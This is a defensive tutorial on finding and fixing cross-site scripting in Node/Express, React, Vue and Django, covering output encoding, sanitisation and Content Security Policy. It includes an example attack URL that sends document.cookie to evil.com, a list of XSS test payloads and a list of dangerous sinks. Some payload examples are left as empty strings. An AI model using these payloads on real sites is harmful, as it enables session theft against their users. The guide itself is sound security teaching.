# How to Fix "Cross-Site Scripting (XSS)" Vulnerabilities

Author: [nawazdhandala](https://www.github.com/nawazdhandala)

Tags: Security, XSS, Web Security, Frontend, JavaScript, OWASP

Description: Learn how to identify and fix Cross-Site Scripting vulnerabilities using output encoding, Content Security Policy, and secure coding practices.

---

Cross-Site Scripting (XSS) is one of the most common web application vulnerabilities. It allows attackers to inject malicious scripts into web pages viewed by other users. These scripts can steal session cookies, redirect users to malicious sites, deface websites, or perform actions on behalf of the victim. This guide explains the different types of XSS, how to identify vulnerable code, and how to implement proper defenses.

## Understanding XSS Types

XSS vulnerabilities are categorized into three main types based on how the malicious script reaches the victim's browser.

```mermaid
flowchart TD
    subgraph "Stored XSS"
        A1[Attacker submits malicious script] --> A2[Script stored in database]
        A2 --> A3[Victim loads page]
        A3 --> A4[Script executes in victim's browser]
    end

    subgraph "Reflected XSS"
        B1[Attacker crafts malicious URL] --> B2[Victim clicks link]
        B2 --> B3[Server reflects input in response]
        B3 --> B4[Script executes in victim's browser]
    end

    subgraph "DOM-based XSS"
        C1[Attacker crafts malicious URL] --> C2[Victim clicks link]
        C2 --> C3[Client-side JS processes URL]
        C3 --> C4[Script executes without server involvement]
    end
```



### Stored XSS

The malicious script is permanently stored on the target server (in a database, comment field, forum post, etc.) and is served to users who view the affected page.

### Reflected XSS

The malicious script is embedded in a URL and is reflected back by the server in the response. The victim must click a malicious link for the attack to work.

### DOM-based XSS

The vulnerability exists in client-side JavaScript code that processes user input and writes it to the DOM without proper sanitization.

## Identifying Vulnerable Code

### Vulnerable Server-Side Code (Node.js/Express)

```javascript
// VULNERABLE - Directly inserting user input into HTML
app.get('/search', (req, res) => {
    const query = req.query.q;
    // User input is directly embedded in the response
    res.send(`<h1>Search results for: ${query}</h1>`);
});

// Attack: /search?q=<script>document.location='http://evil.com/?c='+document.cookie</script>
```

### Vulnerable Template Code (EJS)

```html
<!-- VULNERABLE - Using unescaped output -->
<div class="comment">
    <%- userComment %>  <!-- Raw HTML output - dangerous! -->
</div>

<!-- Attack: userComment = "" -->
```

### Vulnerable Client-Side Code

```javascript
// VULNERABLE - Using innerHTML with user input
function displayMessage(message) {
    document.getElementById('output').innerHTML = message;
}

// Attack: displayMessage("")

// VULNERABLE - Using document.write
function showSearchTerm() {
    const urlParams = new URLSearchParams(window.location.search);
    const term = urlParams.get('term');
    document.write('You searched for: ' + term);
}
```

### Vulnerable React Code

```jsx
// VULNERABLE - Using dangerouslySetInnerHTML with user input
function UserBio({ bio }) {
    return (
        <div dangerouslySetInnerHTML={{ __html: bio }} />
    );
}

// Attack: bio = ""
```

## The Fix: Output Encoding

The primary defense against XSS is context-aware output encoding. User input must be encoded based on where it appears in the HTML document.

### HTML Context Encoding

```javascript
// SECURE - Encode for HTML context
function encodeHTML(str) {
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;');
}

// Using a library is preferred
const he = require('he');

app.get('/search', (req, res) => {
    const query = he.encode(req.query.q);
    res.send(`<h1>Search results for: ${query}</h1>`);
});
```

### JavaScript Context Encoding

```javascript
// SECURE - Encode for JavaScript string context
function encodeJavaScript(str) {
    return JSON.stringify(str);
}

// When embedding data in a script tag
app.get('/page', (req, res) => {
    const userData = { name: req.query.name };
    res.send(`
        <script>
            const user = ${JSON.stringify(userData)};
            console.log(user.name);
        </script>
    `);
});
```

### URL Context Encoding

```javascript
// SECURE - Encode for URL context
function buildSearchUrl(query) {
    const encoded = encodeURIComponent(query);
    return `/search?q=${encoded}`;
}

// In HTML
app.get('/results', (req, res) => {
    const query = req.query.q;
    const safeUrl = encodeURIComponent(query);
    res.send(`<a href="/search?q=${safeUrl}">Search again</a>`);
});
```

### CSS Context Encoding

```javascript
// SECURE - Validate and encode for CSS context
function encodeCSSValue(value) {
    // Only allow safe CSS values
    const safePattern = /^[a-zA-Z0-9#\s\-_.]+$/;
    if (!safePattern.test(value)) {
        return 'inherit';  // Default safe value
    }
    return value;
}
```

## Framework-Specific Solutions

### Express.js with Proper Templating

```javascript
const express = require('express');
const app = express();

// Use EJS with auto-escaping (the default)
app.set('view engine', 'ejs');

app.get('/profile', (req, res) => {
    res.render('profile', {
        username: req.query.name  // Automatically escaped
    });
});
```

```html
<!-- profile.ejs - SECURE -->
<h1>Welcome, <%= username %></h1>  <!-- Auto-escaped -->

<!-- Only use <%- %> for trusted content you control -->
```

### React (Secure by Default)

```jsx
// SECURE - React escapes by default
function UserProfile({ name, bio }) {
    return (
        <div>
            <h1>{name}</h1>  {/* Automatically escaped */}
            <p>{bio}</p>     {/* Automatically escaped */}
        </div>
    );
}

// If you MUST render HTML, sanitize first
import DOMPurify from 'dompurify';

function SafeHTML({ html }) {
    const sanitized = DOMPurify.sanitize(html, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
        ALLOWED_ATTR: ['href']
    });

    return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

### Vue.js (Secure by Default)

```vue
<template>
  <!-- SECURE - Vue escapes by default -->
  <div>
    <h1>{{ username }}</h1>  <!-- Automatically escaped -->
    <p>{{ bio }}</p>
  </div>

  <!-- Only use v-html for trusted, sanitized content -->
  <div v-html="sanitizedContent"></div>
</template>

<script>
import DOMPurify from 'dompurify';

export default {
  props: ['username', 'bio', 'rawContent'],
  computed: {
    sanitizedContent() {
      return DOMPurify.sanitize(this.rawContent);
    }
  }
}
</script>
```

### Django (Secure by Default)

```python
# views.py
def profile(request):
    return render(request, 'profile.html', {
        'username': request.GET.get('name')  # Auto-escaped in template
    })
```

```html
<!-- profile.html - SECURE -->
<h1>Welcome, {{ username }}</h1>  <!-- Auto-escaped -->

<!-- Only use |safe filter for trusted content -->

    {{ trusted_html }}  <!-- Dangerous - only for trusted content -->

```

## DOM-based XSS Prevention

### Safe DOM Manipulation

```javascript
// VULNERABLE
document.getElementById('output').innerHTML = userInput;

// SECURE - Use textContent for plain text
document.getElementById('output').textContent = userInput;

// SECURE - Create elements programmatically
function displayUserComment(comment) {
    const container = document.getElementById('comments');
    const p = document.createElement('p');
    p.textContent = comment;  // Safe - treats as text, not HTML
    container.appendChild(p);
}

// SECURE - Use setAttribute for attributes
function setLinkHref(url) {
    const link = document.getElementById('myLink');

    // Validate URL scheme first
    const parsed = new URL(url, window.location.origin);
    if (parsed.protocol === 'http:' || parsed.protocol === 'https:') {
        link.setAttribute('href', url);
    }
}
```

### Avoiding Dangerous Sinks

```javascript
// DANGEROUS - Avoid these when dealing with user input
eval(userInput);                           // Never use eval
document.write(userInput);                 // Avoid document.write
element.innerHTML = userInput;             // Use textContent instead
element.outerHTML = userInput;             // Use DOM methods instead
element.insertAdjacentHTML('...', input);  // Sanitize first
setTimeout(userInput, 0);                  // Never pass strings
setInterval(userInput, 1000);              // Use function references
new Function(userInput);                   // Avoid dynamic code
location.href = userInput;                 // Validate URL scheme

// SECURE alternatives
element.textContent = userInput;
element.setAttribute('data-value', userInput);
setTimeout(() => safeFunction(), 0);
```

## Content Security Policy (CSP)

CSP is a browser security mechanism that helps prevent XSS by controlling which scripts can execute.

### Implementing CSP Headers

```javascript
// Express.js middleware for CSP
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
    directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"],  // Only allow scripts from same origin
        styleSrc: ["'self'", "'unsafe-inline'"],  // Allow inline styles
        imgSrc: ["'self'", "data:", "https:"],
        connectSrc: ["'self'"],
        fontSrc: ["'self'"],
        objectSrc: ["'none'"],
        mediaSrc: ["'self'"],
        frameSrc: ["'none'"],
    },
}));
```

### CSP with Nonces

```javascript
const crypto = require('crypto');

app.use((req, res, next) => {
    // Generate a unique nonce for each request
    res.locals.nonce = crypto.randomBytes(16).toString('base64');

    res.setHeader('Content-Security-Policy',
        `script-src 'self' 'nonce-${res.locals.nonce}'`
    );
    next();
});

app.get('/', (req, res) => {
    res.send(`
        <html>
        <head>
            <script nonce="${res.locals.nonce}">
                // This script will execute because it has the correct nonce
                console.log('Legitimate script');
            </script>
        </head>
        <body>
            <h1>Welcome</h1>
        </body>
        </html>
    `);
});
```

### CSP Reporting

```javascript
// Enable CSP violation reporting
app.use(helmet.contentSecurityPolicy({
    directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"],
        reportUri: '/csp-report'  // Endpoint to receive violation reports
    },
    reportOnly: true  // Use report-only mode during testing
}));

// Endpoint to receive CSP violation reports
app.post('/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
    console.log('CSP Violation:', req.body);
    // Log to your security monitoring system
    res.status(204).end();
});
```

## HTML Sanitization Libraries

When you need to allow some HTML (like in a rich text editor), use a sanitization library.

### DOMPurify (Client-side)

```javascript
import DOMPurify from 'dompurify';

// Basic sanitization
const dirty = '<b>Bold</b>';
const clean = DOMPurify.sanitize(dirty);
// Result: '<b>Bold</b>'

// Custom configuration
const config = {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href', 'title'],
    ALLOW_DATA_ATTR: false
};

const userContent = '<a href="javascript:alert(1)">Click</a><p>Text</p>';
const sanitized = DOMPurify.sanitize(userContent, config);
// Result: '<a>Click</a><p>Text</p>' (javascript: URL removed)
```

### sanitize-html (Node.js)

```javascript
const sanitizeHtml = require('sanitize-html');

const dirty = '<script>alert(1)</script><p onclick="evil()">Hello</p>';

const clean = sanitizeHtml(dirty, {
    allowedTags: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li'],
    allowedAttributes: {
        'a': ['href', 'title']
    },
    allowedSchemes: ['http', 'https', 'mailto']
});
// Result: '<p>Hello</p>'
```

## Security Headers

Additional headers that help prevent XSS.

```javascript
const helmet = require('helmet');

app.use(helmet({
    contentSecurityPolicy: { /* ... */ },
    xssFilter: true,  // Sets X-XSS-Protection header
    noSniff: true,    // Prevents MIME type sniffing
}));

// Or manually set headers
app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    next();
});
```

## Testing for XSS

Common payloads to test your defenses.

```javascript
// Test payloads for manual testing
const testPayloads = [
    '<script>alert(1)</script>',
    '',
    '<svg onload=alert(1)>',
    'javascript:alert(1)',
    '<a href="javascript:alert(1)">click</a>',
    '<body onload=alert(1)>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '',
    '<iframe src="javascript:alert(1)">',
];

// Automated testing with tools like:
// - OWASP ZAP
// - Burp Suite
// - XSStrike
```

## Best Practices Summary

1. **Encode output** based on context (HTML, JavaScript, URL, CSS)
2. **Use framework defaults** - most modern frameworks escape by default
3. **Implement CSP** - add Content Security Policy headers
4. **Avoid dangerous functions** - innerHTML, eval, document.write
5. **Sanitize rich text** - use DOMPurify or sanitize-html
6. **Validate input** - as an additional layer, not primary defense
7. **Use HttpOnly cookies** - prevent JavaScript access to session cookies
8. **Regular security testing** - use automated scanners and manual testing

## Conclusion

XSS vulnerabilities can have severe consequences, from session hijacking to complete account takeover. The good news is that modern frameworks provide automatic escaping, making XSS prevention easier than ever. The key is to understand when and how to properly encode output, implement Content Security Policy, and avoid dangerous patterns that bypass framework protections.

Always treat user input as untrusted, encode output appropriately for its context, and use defense-in-depth with CSP headers. Regular security testing will help ensure your defenses remain effective against evolving attack techniques.
